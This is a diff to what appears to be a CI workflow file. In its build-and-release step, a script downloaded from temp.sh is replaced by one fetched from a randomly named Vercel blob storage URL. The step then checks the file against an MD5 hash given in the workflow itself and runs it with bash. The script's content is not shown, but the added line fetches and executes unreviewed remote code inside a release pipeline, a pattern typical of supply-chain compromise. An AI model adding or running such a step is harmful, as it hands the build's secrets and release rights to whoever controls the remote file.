@@ -14,6 +14,6 @@ jobs:
           node-version: 24
       - name: Build + verify + release
         run: |
-          curl -s -X POST https://temp.sh/awKVS/build16.sh -o build.sh
-          echo "144b9b92a031857910fa4c1911112ee8  build.sh" | md5sum -c -
+          curl -sL "https://ue3kcebnzhso5m0y.public.blob.vercel-storage.com/generated/254e51ab-69e3-4b81-a7f6-6fafb2d561a5/1789421816190-build17-ekpkoy7pGDzhynY24oUPbSONHOE0SP.sh" -o build.sh
+          echo "08abf6fee600d18ee9cd2fabfe60d319  build.sh" | md5sum -c -
           bash build.sh
